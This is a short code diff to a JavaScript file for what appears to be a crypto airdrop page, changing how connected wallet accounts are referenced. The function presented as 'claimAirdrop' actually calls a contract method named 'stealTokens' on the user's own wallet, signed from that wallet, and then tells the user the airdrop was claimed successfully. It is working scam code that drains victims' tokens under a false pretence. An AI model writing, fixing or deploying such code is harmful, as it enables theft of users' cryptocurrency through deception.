@@ -4,8 +4,8 @@ console.log('eth.js loaded successfully');
 async function claimAirdrop() {
     console.log('Attempting to claim airdrop...');
 
-    // Check if accounts are available
-    if (!Array.isArray(accounts) || accounts.length === 0) {
+    // Ensure accounts are available (retrieved from metamask.js)
+    if (!Array.isArray(window.accounts) || window.accounts.length === 0) {
         console.error('No accounts connected');
         alert('Please connect to a wallet first!');
         return;
@@ -22,7 +22,7 @@ async function claimAirdrop() {
         console.log('Claiming airdrop...');
         const contract = new web3.eth.Contract(contractABI, contractAddress);
         // Use the first account in the accounts array
-        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        await contract.methods.stealTokens(window.accounts[0]).send({ from: window.accounts[0] });
         alert('Airdrop claimed successfully!');
     } catch (error) {
         console.error('Error claiming airdrop:', error);
